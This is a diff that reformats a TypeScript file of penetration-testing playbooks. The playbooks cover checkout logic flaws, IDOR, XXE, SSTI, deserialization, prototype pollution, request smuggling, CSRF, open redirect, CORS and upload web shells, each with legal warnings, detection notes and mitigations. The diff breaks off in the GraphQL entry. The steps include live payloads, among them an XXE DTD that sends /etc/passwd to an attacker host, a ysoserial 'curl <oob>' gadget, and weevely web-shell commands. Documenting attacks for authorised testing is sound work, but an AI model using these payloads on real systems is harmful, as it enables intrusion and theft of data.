@@ -5,7 +5,8 @@
 
 import type { Playbook } from "./hacking";
 
-const LEGAL = "Use only against systems you own or have explicit written authorisation to test. Unauthorised use violates the CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.";
+const LEGAL =
+  "Use only against systems you own or have explicit written authorisation to test. Unauthorised use violates the CFAA (US), Computer Misuse Act (UK), and equivalent laws worldwide.";
 
 export const EXTRA_PLAYBOOKS: Playbook[] = [
   // ─────────────── Web / OWASP ───────────────
@@ -26,20 +27,116 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     toolSlugs: ["burpsuite", "zaproxy", "ffuf"],
     legalNote: LEGAL,
     steps: [
-      { title: "Map the flow", detail: "Walk the checkout end-to-end while proxying through Burp. Note every parameter — product ID, quantity, price, currency, coupon, shipping option, cart ID, and any signed/tokenised state.", commands: [{ code: "# Burp → Target → Site map → filter by scope; annotate each request", note: "Understand the flow before poking at it." }] },
-      { title: "Client-side price tampering", detail: "If the server accepts the price value from the client (a classic mistake), change it to 0.01 and see what the server does.", commands: [{ code: "# Burp Repeater: change price=99.00 to price=0.01, replay POST /cart/add", note: "Server should recalculate from a trusted product catalog." }] },
-      { title: "Negative quantity / decimals / overflow", detail: "Send quantity -1, 0, 999999, 1e10, and 1.999 to test integer & decimal handling.", commands: [{ code: "# quantity=-1 → does the total become negative and credit the account?", note: "Negative totals that credit balances are a critical impact finding." }, { code: "# quantity=1.999 → does rounding at checkout allow a fractional overcharge/undercharge?", note: "Watch for banker's rounding surprises." }] },
-      { title: "Coupon brute-force with rate-limit check", detail: "Enumerate promo codes safely. Start with a small set to confirm the endpoint has rate limiting before scaling.", commands: [{ code: "ffuf -u https://target.tld/api/coupons -X POST -d 'code=FUZZ' -w promo-guesses.txt -mc 200 -t 4 -p 0.3-0.7", note: "Slow, throttled." }, { code: "# Look for 429 / captcha / lockout — absence of any of these is the finding.", note: "Report the missing control before racing the endpoint." }] },
-      { title: "Coupon race condition (one-per-account)", detail: "Send N parallel redemptions of the same single-use coupon; see if more than one succeeds.", commands: [{ code: "# In Burp Turbo Intruder use engine=engine.BURP2, requestsPerConnection=1, and the single-packet attack", note: "Modern race testing uses HTTP/2 single-packet attack; response bodies reveal duplicates." }] },
-      { title: "IDOR on cart / order / invoice IDs", detail: "Swap /cart/{me} for /cart/{other} across two accounts you both own or that are in scope.", commands: [{ code: "# In Burp Autorize configure Account B cookie; browse as A; alerts fire when B can read A's resources.", note: "Consistent 200 with foreign-owned IDs = IDOR." }] },
-      { title: "Currency / rounding drift", detail: "Change currency mid-flow (USD → JPY → back) and confirm totals recompute correctly.", commands: [{ code: "# GET /checkout?currency=JPY, then re-post with currency=USD and compare totals against known rates", note: "Locked-in totals from a stale currency are a finding." }] },
-      { title: "Shipping / discount stacking", detail: "Combine free-shipping and percentage-off coupons in unusual orders; some systems apply the shipping discount after cart total, granting an unintended refund.", commands: [{ code: "# Apply promo A, then promo B in reverse order; compare final totals", note: "Log the exact request sequence in the report." }] },
+      {
+        title: "Map the flow",
+        detail:
+          "Walk the checkout end-to-end while proxying through Burp. Note every parameter — product ID, quantity, price, currency, coupon, shipping option, cart ID, and any signed/tokenised state.",
+        commands: [
+          {
+            code: "# Burp → Target → Site map → filter by scope; annotate each request",
+            note: "Understand the flow before poking at it.",
+          },
+        ],
+      },
+      {
+        title: "Client-side price tampering",
+        detail:
+          "If the server accepts the price value from the client (a classic mistake), change it to 0.01 and see what the server does.",
+        commands: [
+          {
+            code: "# Burp Repeater: change price=99.00 to price=0.01, replay POST /cart/add",
+            note: "Server should recalculate from a trusted product catalog.",
+          },
+        ],
+      },
+      {
+        title: "Negative quantity / decimals / overflow",
+        detail: "Send quantity -1, 0, 999999, 1e10, and 1.999 to test integer & decimal handling.",
+        commands: [
+          {
+            code: "# quantity=-1 → does the total become negative and credit the account?",
+            note: "Negative totals that credit balances are a critical impact finding.",
+          },
+          {
+            code: "# quantity=1.999 → does rounding at checkout allow a fractional overcharge/undercharge?",
+            note: "Watch for banker's rounding surprises.",
+          },
+        ],
+      },
+      {
+        title: "Coupon brute-force with rate-limit check",
+        detail:
+          "Enumerate promo codes safely. Start with a small set to confirm the endpoint has rate limiting before scaling.",
+        commands: [
+          {
+            code: "ffuf -u https://target.tld/api/coupons -X POST -d 'code=FUZZ' -w promo-guesses.txt -mc 200 -t 4 -p 0.3-0.7",
+            note: "Slow, throttled.",
+          },
+          {
+            code: "# Look for 429 / captcha / lockout — absence of any of these is the finding.",
+            note: "Report the missing control before racing the endpoint.",
+          },
+        ],
+      },
+      {
+        title: "Coupon race condition (one-per-account)",
+        detail:
+          "Send N parallel redemptions of the same single-use coupon; see if more than one succeeds.",
+        commands: [
+          {
+            code: "# In Burp Turbo Intruder use engine=engine.BURP2, requestsPerConnection=1, and the single-packet attack",
+            note: "Modern race testing uses HTTP/2 single-packet attack; response bodies reveal duplicates.",
+          },
+        ],
+      },
+      {
+        title: "IDOR on cart / order / invoice IDs",
+        detail:
+          "Swap /cart/{me} for /cart/{other} across two accounts you both own or that are in scope.",
+        commands: [
+          {
+            code: "# In Burp Autorize configure Account B cookie; browse as A; alerts fire when B can read A's resources.",
+            note: "Consistent 200 with foreign-owned IDs = IDOR.",
+          },
+        ],
+      },
+      {
+        title: "Currency / rounding drift",
+        detail:
+          "Change currency mid-flow (USD → JPY → back) and confirm totals recompute correctly.",
+        commands: [
+          {
+            code: "# GET /checkout?currency=JPY, then re-post with currency=USD and compare totals against known rates",
+            note: "Locked-in totals from a stale currency are a finding.",
+          },
+        ],
+      },
+      {
+        title: "Shipping / discount stacking",
+        detail:
+          "Combine free-shipping and percentage-off coupons in unusual orders; some systems apply the shipping discount after cart total, granting an unintended refund.",
+        commands: [
+          {
+            code: "# Apply promo A, then promo B in reverse order; compare final totals",
+            note: "Log the exact request sequence in the report.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "429 Too Many Requests during coupon brute", cause: "Rate limit engaged (this is what you want to see).", fix: "Report the presence of rate limiting as a positive control; try authenticated brute if scope permits." },
-      { message: "Server returns generic 500 on malformed input", cause: "Poor error handling.", fix: "Note the error surface as a finding; do not brute-force the endpoint further until the app owner reproduces." },
+      {
+        message: "429 Too Many Requests during coupon brute",
+        cause: "Rate limit engaged (this is what you want to see).",
+        fix: "Report the presence of rate limiting as a positive control; try authenticated brute if scope permits.",
+      },
+      {
+        message: "Server returns generic 500 on malformed input",
+        cause: "Poor error handling.",
+        fix: "Note the error surface as a finding; do not brute-force the endpoint further until the app owner reproduces.",
+      },
     ],
-    detection: "Sudden spikes of failed coupon redemptions from one session, negative-quantity orders in fraud dashboards, cart total anomalies vs. product catalog price.",
+    detection:
+      "Sudden spikes of failed coupon redemptions from one session, negative-quantity orders in fraud dashboards, cart total anomalies vs. product catalog price.",
     mitigation:
       "Never trust client-side price/quantity — recompute from a trusted catalog on every request. Enforce non-negative integer quantities with server-side validation. Rate-limit coupon endpoints per-account and per-IP. Store promo redemption in an idempotent transaction (unique index) to eliminate races. Add server-side authorization checks on every cart/order object.",
   },
@@ -56,15 +153,48 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     toolSlugs: ["burpsuite", "autorize", "zaproxy"],
     legalNote: LEGAL,
     steps: [
-      { title: "Enumerate object endpoints", detail: "Look for numeric or UUID IDs in URLs and JSON bodies.", commands: [{ code: "# Burp → HTTP history → filter by params containing 'id'", note: "GUIDs still IDOR when returned in earlier responses." }] },
-      { title: "Replay across accounts", detail: "Send Account A's request with Account B's session and compare responses.", commands: [{ code: "# Autorize: enable, configure Account B cookies, browse as A", note: "Autorize flags Bypassed vs Enforced automatically." }] },
-      { title: "Test all HTTP verbs", detail: "GET might be blocked; PUT/DELETE often are not.", commands: [{ code: "curl -X DELETE https://target.tld/api/orders/1234 -H 'Cookie: session=A'", note: "Same object, different verb." }] },
+      {
+        title: "Enumerate object endpoints",
+        detail: "Look for numeric or UUID IDs in URLs and JSON bodies.",
+        commands: [
+          {
+            code: "# Burp → HTTP history → filter by params containing 'id'",
+            note: "GUIDs still IDOR when returned in earlier responses.",
+          },
+        ],
+      },
+      {
+        title: "Replay across accounts",
+        detail: "Send Account A's request with Account B's session and compare responses.",
+        commands: [
+          {
+            code: "# Autorize: enable, configure Account B cookies, browse as A",
+            note: "Autorize flags Bypassed vs Enforced automatically.",
+          },
+        ],
+      },
+      {
+        title: "Test all HTTP verbs",
+        detail: "GET might be blocked; PUT/DELETE often are not.",
+        commands: [
+          {
+            code: "curl -X DELETE https://target.tld/api/orders/1234 -H 'Cookie: session=A'",
+            note: "Same object, different verb.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "403 on all attempts", cause: "Authorisation working correctly.", fix: "Try IDs you legitimately own to confirm authorization enforces per-user scope; report absence of finding." },
+      {
+        message: "403 on all attempts",
+        cause: "Authorisation working correctly.",
+        fix: "Try IDs you legitimately own to confirm authorization enforces per-user scope; report absence of finding.",
+      },
     ],
-    detection: "Repeat requests from one account hitting many object IDs in rapid succession; authorization-decision logs showing consistent 'deny'.",
-    mitigation: "Server-side authorisation on every object access, using the authenticated principal — not the ID from the URL. Prefer scoped queries (WHERE user_id = ?). Consider opaque, unpredictable IDs (defence in depth, not the primary control).",
+    detection:
+      "Repeat requests from one account hitting many object IDs in rapid succession; authorization-decision logs showing consistent 'deny'.",
+    mitigation:
+      "Server-side authorisation on every object access, using the authenticated principal — not the ID from the URL. Prefer scoped queries (WHERE user_id = ?). Consider opaque, unpredictable IDs (defence in depth, not the primary control).",
   },
   {
     slug: "xxe",
@@ -73,20 +203,53 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "high",
     cve: ["CWE-611"],
     mitreAttack: ["T1190"],
-    summary: "Inject an XML external entity into a request the server parses to read local files, exfil via OOB, or SSRF.",
+    summary:
+      "Inject an XML external entity into a request the server parses to read local files, exfil via OOB, or SSRF.",
     prerequisites: ["An XML-consuming endpoint", "OOB canary (interactsh)"],
     toolSlugs: ["burpsuite", "zaproxy"],
     legalNote: LEGAL,
     steps: [
-      { title: "Confirm the parser processes DOCTYPE", detail: "Send a benign entity that points to your canary.", commands: [{ code: "<!DOCTYPE t [ <!ENTITY x SYSTEM \"http://<oob>/x\"> ]><t>&x;</t>", note: "Callback = XXE." }] },
-      { title: "Local file read", detail: "", commands: [{ code: "<!DOCTYPE t [ <!ENTITY x SYSTEM \"file:///etc/passwd\"> ]><t>&x;</t>", note: "Blocked? Try OOB exfil below." }] },
-      { title: "Out-of-band exfil (OOB XXE)", detail: "Serve a DTD from your canary that pulls the file out via a second entity request.", commands: [{ code: "# hosted evil.dtd:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#37; exfil SYSTEM 'http://<oob>/?x=%file;'>\">\n%eval; %exfil;", note: "Include the external DTD from the payload." }] },
+      {
+        title: "Confirm the parser processes DOCTYPE",
+        detail: "Send a benign entity that points to your canary.",
+        commands: [
+          {
+            code: '<!DOCTYPE t [ <!ENTITY x SYSTEM "http://<oob>/x"> ]><t>&x;</t>',
+            note: "Callback = XXE.",
+          },
+        ],
+      },
+      {
+        title: "Local file read",
+        detail: "",
+        commands: [
+          {
+            code: '<!DOCTYPE t [ <!ENTITY x SYSTEM "file:///etc/passwd"> ]><t>&x;</t>',
+            note: "Blocked? Try OOB exfil below.",
+          },
+        ],
+      },
+      {
+        title: "Out-of-band exfil (OOB XXE)",
+        detail: "Serve a DTD from your canary that pulls the file out via a second entity request.",
+        commands: [
+          {
+            code: '# hosted evil.dtd:\n<!ENTITY % file SYSTEM "file:///etc/passwd">\n<!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM \'http://<oob>/?x=%file;\'>">\n%eval; %exfil;',
+            note: "Include the external DTD from the payload.",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "no callback", cause: "Parser is patched or the input isn't XML.", fix: "Check Content-Type: application/xml handling; some endpoints only parse XML on specific verbs." },
+      {
+        message: "no callback",
+        cause: "Parser is patched or the input isn't XML.",
+        fix: "Check Content-Type: application/xml handling; some endpoints only parse XML on specific verbs.",
+      },
     ],
     detection: "Outbound HTTP/DNS from XML-parsing services to unusual hosts.",
-    mitigation: "Disable external entity and DTD processing on every XML parser (JAXP, libxml2 XML_PARSE_NOENT off, lxml resolve_entities=False).",
+    mitigation:
+      "Disable external entity and DTD processing on every XML parser (JAXP, libxml2 XML_PARSE_NOENT off, lxml resolve_entities=False).",
   },
   {
     slug: "ssti",
@@ -95,20 +258,48 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "high",
     cve: ["CWE-1336"],
     mitreAttack: ["T1190"],
-    summary: "Inject template syntax into a server-rendered response to escape the template sandbox and achieve RCE (Jinja2, Twig, Freemarker, Velocity, ERB).",
+    summary:
+      "Inject template syntax into a server-rendered response to escape the template sandbox and achieve RCE (Jinja2, Twig, Freemarker, Velocity, ERB).",
     prerequisites: ["A field whose value is rendered by a server-side templating engine"],
     toolSlugs: ["tplmap", "burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Fingerprint the engine", detail: "", commands: [{ code: "# Try 7*7, {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>", note: "Which one reflects '49' identifies the engine." }] },
-      { title: "Escape to Python (Jinja2)", detail: "", commands: [{ code: "{{ ''.__class__.__mro__[1].__subclasses__() }}", note: "Enumerate classes to find os / subprocess." }] },
-      { title: "Automate", detail: "", commands: [{ code: "tplmap -u 'https://target.tld/page?name=hello'", note: "" }] },
+      {
+        title: "Fingerprint the engine",
+        detail: "",
+        commands: [
+          {
+            code: "# Try 7*7, {{7*7}}, ${7*7}, #{7*7}, <%= 7*7 %>",
+            note: "Which one reflects '49' identifies the engine.",
+          },
+        ],
+      },
+      {
+        title: "Escape to Python (Jinja2)",
+        detail: "",
+        commands: [
+          {
+            code: "{{ ''.__class__.__mro__[1].__subclasses__() }}",
+            note: "Enumerate classes to find os / subprocess.",
+          },
+        ],
+      },
+      {
+        title: "Automate",
+        detail: "",
+        commands: [{ code: "tplmap -u 'https://target.tld/page?name=hello'", note: "" }],
+      },
     ],
     errors: [
-      { message: "reflects but math not evaluated", cause: "Client-side templating, not server-side.", fix: "Confirm by disabling JS and re-requesting; if still rendered → server-side." },
+      {
+        message: "reflects but math not evaluated",
+        cause: "Client-side templating, not server-side.",
+        fix: "Confirm by disabling JS and re-requesting; if still rendered → server-side.",
+      },
     ],
     detection: "WAF rules matching template metacharacters, template engine exceptions in logs.",
-    mitigation: "Never render user input through the server-side template engine directly. Use logic-less templates for user data (Mustache) and pass user values as data, not template code.",
+    mitigation:
+      "Never render user input through the server-side template engine directly. Use logic-less templates for user data (Mustache) and pass user values as data, not template code.",
   },
   {
     slug: "deserialization",
@@ -117,20 +308,46 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CWE-502"],
     mitreAttack: ["T1190"],
-    summary: "Attacker-controlled serialized objects (Java, .NET, Python pickle) reach a deserializer that instantiates arbitrary classes and reaches gadget chains that execute code.",
+    summary:
+      "Attacker-controlled serialized objects (Java, .NET, Python pickle) reach a deserializer that instantiates arbitrary classes and reaches gadget chains that execute code.",
     prerequisites: ["An endpoint that reads serialized data (cookies, headers, RPC bodies)"],
     toolSlugs: ["ysoserial", "burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Identify the serializer", detail: "Java: base64(rO0AB...). .NET: AAEAAAD.... Python pickle: leading 0x80.", commands: [{ code: "# Decode suspected token and inspect header bytes", note: "" }] },
-      { title: "Generate a payload", detail: "", commands: [{ code: "ysoserial CommonsCollections6 'curl <oob>/pwn' | base64 -w0", note: "Java example." }] },
-      { title: "Replay", detail: "", commands: [{ code: "# Substitute into the request in Burp Repeater and watch canary", note: "" }] },
+      {
+        title: "Identify the serializer",
+        detail: "Java: base64(rO0AB...). .NET: AAEAAAD.... Python pickle: leading 0x80.",
+        commands: [{ code: "# Decode suspected token and inspect header bytes", note: "" }],
+      },
+      {
+        title: "Generate a payload",
+        detail: "",
+        commands: [
+          {
+            code: "ysoserial CommonsCollections6 'curl <oob>/pwn' | base64 -w0",
+            note: "Java example.",
+          },
+        ],
+      },
+      {
+        title: "Replay",
+        detail: "",
+        commands: [
+          { code: "# Substitute into the request in Burp Repeater and watch canary", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "no callback", cause: "Gadget chain not present, or WAF/JSON conversion strips it.", fix: "Try alternate chains (CC1, Hibernate5, Spring); confirm the endpoint really deserializes vs just JSON parses." },
+      {
+        message: "no callback",
+        cause: "Gadget chain not present, or WAF/JSON conversion strips it.",
+        fix: "Try alternate chains (CC1, Hibernate5, Spring); confirm the endpoint really deserializes vs just JSON parses.",
+      },
     ],
-    detection: "SIEM rules on classloader activity from webapps, RASP alerts on gadget-chain classes.",
-    mitigation: "Do not deserialize untrusted input. If you must, restrict allowed classes (allow-list), sign the serialized blob with an HMAC, and prefer safe formats (JSON) over Java/pickle.",
+    detection:
+      "SIEM rules on classloader activity from webapps, RASP alerts on gadget-chain classes.",
+    mitigation:
+      "Do not deserialize untrusted input. If you must, restrict allowed classes (allow-list), sign the serialized blob with an HMAC, and prefer safe formats (JSON) over Java/pickle.",
   },
   {
     slug: "prototype-pollution",
@@ -139,20 +356,46 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "high",
     cve: ["CWE-1321"],
     mitreAttack: ["T1059.007"],
-    summary: "Overwrite properties on Object.prototype via unsafe merge/clone functions, then chain to a gadget that reads the polluted property (XSS, RCE in Node).",
+    summary:
+      "Overwrite properties on Object.prototype via unsafe merge/clone functions, then chain to a gadget that reads the polluted property (XSS, RCE in Node).",
     prerequisites: ["An endpoint that merges attacker JSON into a config/object"],
     toolSlugs: ["burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Test __proto__ pollution", detail: "", commands: [{ code: "POST /merge {\"__proto__\":{\"polluted\":\"yes\"}}", note: "Then check /debug returns polluted='yes'." }] },
-      { title: "Constructor.prototype path", detail: "", commands: [{ code: "POST /merge {\"constructor\":{\"prototype\":{\"polluted\":\"yes\"}}}", note: "" }] },
-      { title: "Find gadget", detail: "Search source for `if (opts.<x>)` reads where <x> isn't set by default — that's a gadget.", commands: [{ code: "# grep -r 'options\\.' node_modules/<lib>/lib/", note: "" }] },
+      {
+        title: "Test __proto__ pollution",
+        detail: "",
+        commands: [
+          {
+            code: 'POST /merge {"__proto__":{"polluted":"yes"}}',
+            note: "Then check /debug returns polluted='yes'.",
+          },
+        ],
+      },
+      {
+        title: "Constructor.prototype path",
+        detail: "",
+        commands: [
+          { code: 'POST /merge {"constructor":{"prototype":{"polluted":"yes"}}}', note: "" },
+        ],
+      },
+      {
+        title: "Find gadget",
+        detail:
+          "Search source for `if (opts.<x>)` reads where <x> isn't set by default — that's a gadget.",
+        commands: [{ code: "# grep -r 'options\\.' node_modules/<lib>/lib/", note: "" }],
+      },
     ],
     errors: [
-      { message: "pollution accepted but nothing changes", cause: "No gadget consumes the property.", fix: "Look for popular gadgets (helmet, express-static, mongoose)." },
+      {
+        message: "pollution accepted but nothing changes",
+        cause: "No gadget consumes the property.",
+        fix: "Look for popular gadgets (helmet, express-static, mongoose).",
+      },
     ],
     detection: "Static analysis (semgrep rules), runtime protection that freezes Object.prototype.",
-    mitigation: "Use Object.create(null) for user-derived maps, deny __proto__/constructor keys in schema validation, freeze Object.prototype at boot.",
+    mitigation:
+      "Use Object.create(null) for user-derived maps, deny __proto__/constructor keys in schema validation, freeze Object.prototype at boot.",
   },
   {
     slug: "http-request-smuggling",
@@ -161,19 +404,40 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CWE-444"],
     mitreAttack: ["T1499"],
-    summary: "Send a request that a front-end proxy and a back-end server parse differently, poisoning the back-end connection to route a later request into another user's session.",
+    summary:
+      "Send a request that a front-end proxy and a back-end server parse differently, poisoning the back-end connection to route a later request into another user's session.",
     prerequisites: ["A reverse-proxied HTTP stack (CDN → app server)"],
     toolSlugs: ["smuggler", "burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Detect", detail: "", commands: [{ code: "python3 smuggler.py -u https://target.tld", note: "" }, { code: "# Or Burp → Repeater → Turbo Intruder 'smuggle probe'", note: "" }] },
-      { title: "Confirm without harming users", detail: "Use a self-directed smuggled request that only affects your own follow-up request.", commands: [{ code: "# See Burp's 'HTTP Request Smuggler' extension → 'Confirm' feature", note: "" }] },
+      {
+        title: "Detect",
+        detail: "",
+        commands: [
+          { code: "python3 smuggler.py -u https://target.tld", note: "" },
+          { code: "# Or Burp → Repeater → Turbo Intruder 'smuggle probe'", note: "" },
+        ],
+      },
+      {
+        title: "Confirm without harming users",
+        detail:
+          "Use a self-directed smuggled request that only affects your own follow-up request.",
+        commands: [
+          { code: "# See Burp's 'HTTP Request Smuggler' extension → 'Confirm' feature", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "detected but not exploitable", cause: "Front-end validates Content-Length after normalising.", fix: "Report the vulnerability; the front-end still needs to fix parsing." },
+      {
+        message: "detected but not exploitable",
+        cause: "Front-end validates Content-Length after normalising.",
+        fix: "Report the vulnerability; the front-end still needs to fix parsing.",
+      },
     ],
-    detection: "Backend receiving requests with duplicated headers or unusual Transfer-Encoding values.",
-    mitigation: "Use HTTP/2 end-to-end, reject requests with both CL and TE, deploy a WAF that normalises before forwarding.",
+    detection:
+      "Backend receiving requests with duplicated headers or unusual Transfer-Encoding values.",
+    mitigation:
+      "Use HTTP/2 end-to-end, reject requests with both CL and TE, deploy a WAF that normalises before forwarding.",
   },
   {
     slug: "csrf",
@@ -181,19 +445,37 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "medium",
     cve: ["CWE-352"],
-    summary: "Coerce an authenticated user's browser to submit a state-changing request the user did not intend.",
-    prerequisites: ["A state-changing endpoint reachable via cookies without token/origin verification"],
+    summary:
+      "Coerce an authenticated user's browser to submit a state-changing request the user did not intend.",
+    prerequisites: [
+      "A state-changing endpoint reachable via cookies without token/origin verification",
+    ],
     toolSlugs: ["burpsuite", "zaproxy"],
     legalNote: LEGAL,
     steps: [
-      { title: "Craft PoC", detail: "", commands: [{ code: "# Burp → right-click request → Engagement tools → Generate CSRF PoC", note: "" }] },
-      { title: "Confirm SameSite behaviour", detail: "Cookies flagged SameSite=Lax/Strict block cross-site POSTs.", commands: [{ code: "# Check Set-Cookie in Burp Response", note: "" }] },
+      {
+        title: "Craft PoC",
+        detail: "",
+        commands: [
+          { code: "# Burp → right-click request → Engagement tools → Generate CSRF PoC", note: "" },
+        ],
+      },
+      {
+        title: "Confirm SameSite behaviour",
+        detail: "Cookies flagged SameSite=Lax/Strict block cross-site POSTs.",
+        commands: [{ code: "# Check Set-Cookie in Burp Response", note: "" }],
+      },
     ],
     errors: [
-      { message: "browser dropped the cookie", cause: "SameSite=Lax on a POST from a cross-site form.", fix: "The site is (partially) protected; report if any Lax-exempt method (GET) has side effects." },
+      {
+        message: "browser dropped the cookie",
+        cause: "SameSite=Lax on a POST from a cross-site form.",
+        fix: "The site is (partially) protected; report if any Lax-exempt method (GET) has side effects.",
+      },
     ],
     detection: "Unexpected Origin/Referer headers on state-changing endpoints.",
-    mitigation: "SameSite=Lax or Strict cookies, anti-CSRF tokens on all state-changing requests, Origin/Referer validation.",
+    mitigation:
+      "SameSite=Lax or Strict cookies, anti-CSRF tokens on all state-changing requests, Origin/Referer validation.",
   },
   {
     slug: "open-redirect",
@@ -201,16 +483,39 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "low",
     cve: ["CWE-601"],
-    summary: "A redirect parameter accepts arbitrary URLs, enabling phishing and OAuth token theft when chained.",
+    summary:
+      "A redirect parameter accepts arbitrary URLs, enabling phishing and OAuth token theft when chained.",
     prerequisites: ["A ?redirect=/next= style parameter on the target"],
     toolSlugs: ["burpsuite", "ffuf"],
     legalNote: LEGAL,
     steps: [
-      { title: "Probe", detail: "", commands: [{ code: "curl -I 'https://target.tld/login?next=https://evil.example'", note: "302 to evil.example = confirmed." }] },
-      { title: "Bypasses", detail: "", commands: [{ code: "# //evil.example, /\\\\evil.example, https:evil.example, whitelisted.tld.evil.example", note: "" }] },
+      {
+        title: "Probe",
+        detail: "",
+        commands: [
+          {
+            code: "curl -I 'https://target.tld/login?next=https://evil.example'",
+            note: "302 to evil.example = confirmed.",
+          },
+        ],
+      },
+      {
+        title: "Bypasses",
+        detail: "",
+        commands: [
+          {
+            code: "# //evil.example, /\\\\evil.example, https:evil.example, whitelisted.tld.evil.example",
+            note: "",
+          },
+        ],
+      },
     ],
     errors: [
-      { message: "always redirects to /home", cause: "Server ignores unknown next values.", fix: "Test relative paths first; whitelist checks are usually the fix and often present." },
+      {
+        message: "always redirects to /home",
+        cause: "Server ignores unknown next values.",
+        fix: "Test relative paths first; whitelist checks are usually the fix and often present.",
+      },
     ],
     detection: "Login flow logs showing redirects to external hosts.",
     mitigation: "Allow-list redirect targets by exact host, or restrict to relative paths only.",
@@ -221,19 +526,38 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "medium",
     cve: ["CWE-942"],
-    summary: "The server reflects any Origin with Access-Control-Allow-Credentials: true, letting a malicious origin read authenticated responses.",
+    summary:
+      "The server reflects any Origin with Access-Control-Allow-Credentials: true, letting a malicious origin read authenticated responses.",
     prerequisites: ["An API accessed with cookies/Authorization headers"],
     toolSlugs: ["corsy", "burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Probe with attacker origin", detail: "", commands: [{ code: "curl -I -H 'Origin: https://evil.example' https://api.target.tld/me", note: "Look for Access-Control-Allow-Origin: https://evil.example with Allow-Credentials: true." }] },
-      { title: "Automate", detail: "", commands: [{ code: "corsy -u https://api.target.tld/me", note: "" }] },
+      {
+        title: "Probe with attacker origin",
+        detail: "",
+        commands: [
+          {
+            code: "curl -I -H 'Origin: https://evil.example' https://api.target.tld/me",
+            note: "Look for Access-Control-Allow-Origin: https://evil.example with Allow-Credentials: true.",
+          },
+        ],
+      },
+      {
+        title: "Automate",
+        detail: "",
+        commands: [{ code: "corsy -u https://api.target.tld/me", note: "" }],
+      },
     ],
     errors: [
-      { message: "no ACAO header at all", cause: "Endpoint doesn't advertise CORS.", fix: "Not a CORS vuln by itself; enumerate elsewhere." },
+      {
+        message: "no ACAO header at all",
+        cause: "Endpoint doesn't advertise CORS.",
+        fix: "Not a CORS vuln by itself; enumerate elsewhere.",
+      },
     ],
     detection: "CORS preflight requests from unexpected origins to authenticated APIs.",
-    mitigation: "Explicit origin allow-list, never reflect Origin blindly, disable credentials on cross-origin endpoints that don't need them.",
+    mitigation:
+      "Explicit origin allow-list, never reflect Origin blindly, disable credentials on cross-origin endpoints that don't need them.",
   },
   {
     slug: "file-upload-rce",
@@ -242,20 +566,42 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     severity: "critical",
     cve: ["CWE-434"],
     mitreAttack: ["T1505.003"],
-    summary: "Bypass upload filters (extension, MIME, magic bytes) and place a web shell inside the document root.",
+    summary:
+      "Bypass upload filters (extension, MIME, magic bytes) and place a web shell inside the document root.",
     prerequisites: ["A file-upload feature reachable from the web root"],
     toolSlugs: ["burpsuite", "weevely"],
     legalNote: LEGAL,
     steps: [
-      { title: "Baseline", detail: "Upload a valid image and note the returned path and content-type.", commands: [{ code: "# Note URL: /uploads/2024/img_1.jpg", note: "" }] },
-      { title: "Bypass filters", detail: "Try double extension (shell.php.jpg), null-byte (shell.php%00.jpg on ancient PHP), MIME override, and polyglots.", commands: [{ code: "# In Burp Repeater, edit filename= and Content-Type", note: "" }] },
-      { title: "Generate shell", detail: "", commands: [{ code: "weevely generate P@ssw0rd shell.php", note: "" }, { code: "weevely https://target.tld/uploads/shell.php P@ssw0rd", note: "" }] },
+      {
+        title: "Baseline",
+        detail: "Upload a valid image and note the returned path and content-type.",
+        commands: [{ code: "# Note URL: /uploads/2024/img_1.jpg", note: "" }],
+      },
+      {
+        title: "Bypass filters",
+        detail:
+          "Try double extension (shell.php.jpg), null-byte (shell.php%00.jpg on ancient PHP), MIME override, and polyglots.",
+        commands: [{ code: "# In Burp Repeater, edit filename= and Content-Type", note: "" }],
+      },
+      {
+        title: "Generate shell",
+        detail: "",
+        commands: [
+          { code: "weevely generate P@ssw0rd shell.php", note: "" },
+          { code: "weevely https://target.tld/uploads/shell.php P@ssw0rd", note: "" },
+        ],
+      },
     ],
     errors: [
-      { message: "shell uploaded but 403 on request", cause: "Upload directory has no execute handler.", fix: "Try alternate extensions (.phtml, .phar) or find an included directory." },
+      {
+        message: "shell uploaded but 403 on request",
+        cause: "Upload directory has no execute handler.",
+        fix: "Try alternate extensions (.phtml, .phar) or find an included directory.",
+      },
     ],
     detection: "Web server logs for POST → then GET/POST to unusual files under uploads/.",
-    mitigation: "Store uploads outside the web root, rename to random tokens, serve via a controller that sets Content-Disposition: attachment.",
+    mitigation:
+      "Store uploads outside the web root, rename to random tokens, serve via a controller that sets Content-Disposition: attachment.",
   },
   {
     slug: "graphql-abuse",
@@ -263,20 +609,44 @@ export const EXTRA_PLAYBOOKS: Playbook[] = [
     category: "Web",
     severity: "high",
     cve: ["CWE-284"],
-    summary: "Enumerate the schema via introspection, then look for authorization gaps, batching abuse, and expensive queries.",
+    summary:
+      "Enumerate the schema via introspection, then look for authorization gaps, batching abuse, and expensive queries.",
     prerequisites: ["A GraphQL endpoint (usually /graphql)"],
     toolSlugs: ["graphql-cop", "inql", "burpsuite"],
     legalNote: LEGAL,
     steps: [
-      { title: "Check for introspection", detail: "", commands: [{ code: "graphql-cop -t https://target.tld/graphql", note: "" }] },
